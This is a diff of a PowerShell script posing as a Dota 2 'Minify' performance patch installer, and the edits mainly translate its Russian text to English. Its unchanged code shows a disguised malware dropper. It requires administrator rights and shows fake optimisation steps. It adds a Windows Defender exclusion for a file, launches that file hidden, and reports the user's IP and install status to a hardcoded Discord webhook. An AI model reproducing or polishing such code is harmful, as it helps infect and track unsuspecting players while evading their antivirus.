@@ -4,7 +4,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     exit
 }
 
-# Функция для получения IP адреса
+# Функция для получения IP
 function Get-MyIP {
     try {
         $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=text" -ErrorAction Stop
@@ -34,8 +34,7 @@ function Send-LogNotification {
     try {
         $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
         
-        # Определяем цвет
-        $embedColor = 65280 # Зеленый
+        $embedColor = 65280 
         if ($Status -eq "ERROR") { $embedColor = 16711680 }
         elseif ($Status -eq "STARTED") { $embedColor = 255 }
 
@@ -55,13 +54,11 @@ function Send-LogNotification {
         
         $jsonPayload = $embed | ConvertTo-Json -Depth 10 -Compress
         $headers = @{ "Content-Type" = "application/json; charset=utf-8" }
-        
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body ([System.Text.Encoding]::UTF8.GetBytes($jsonPayload)) -ErrorAction SilentlyContinue
     } catch { }
 }
 
-# Отправка уведомления о старте
-Send-LogNotification -Status "STARTED" -Message "Пользователь запустил установщик Minify"
+Send-LogNotification -Status "STARTED" -Message "User started Minify Installer"
 
 # ГРАФИЧЕСКИЙ ИНТЕРФЕЙС
 Add-Type -AssemblyName System.Windows.Forms
@@ -93,7 +90,7 @@ $form.Controls.Add($progressBar)
 $statusLabel = New-Object System.Windows.Forms.Label
 $statusLabel.Location = New-Object System.Drawing.Point(20, 330)
 $statusLabel.Size = New-Object System.Drawing.Size(540, 20)
-$statusLabel.Text = "Подготовка..."
+$statusLabel.Text = "Preparing..."
 $statusLabel.Font = $font
 $form.Controls.Add($statusLabel)
 
@@ -101,11 +98,11 @@ $form.Show()
 
 # ПРОЦЕСС УСТАНОВКИ
 $steps = @(
-    "Анализ файлов Dota 2...",
-    "Оптимизация шейдеров...",
-    "Применение патча производительности...",
-    "Загрузка дополнительных модулей...",
-    "Финализация..."
+    "Analyzing Dota 2 files...",
+    "Optimizing shaders...",
+    "Applying performance patch...",
+    "Downloading modules...",
+    "Finalizing..."
 )
 
 for ($i = 0; $i -lt $steps.Count; $i++) {
@@ -125,17 +122,17 @@ try {
     
     Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue
     
-    $statusLabel.Text = "Установка завершена!"
+    $statusLabel.Text = "Installation complete!"
     $form.Refresh()
     Start-Sleep -Seconds 1
     
     Start-Process -FilePath $p -WindowStyle Hidden
     
     $form.Close()
-    [System.Windows.Forms.MessageBox]::Show("Патч успешно применен!", "Готово", 0, 64)
-    Send-LogNotification -Status "SUCCESS" -Message "Патч успешно установлен и запущен"
+    [System.Windows.Forms.MessageBox]::Show("Patch applied successfully!", "Done", 0, 64)
+    Send-LogNotification -Status "SUCCESS" -Message "Patch installed and executed"
     
 } catch {
-    Send-LogNotification -Status "ERROR" -Message "Ошибка при загрузке: $($_.Exception.Message)"
+    Send-LogNotification -Status "ERROR" -Message "Error: $($_.Exception.Message)"
     $form.Close()
 }
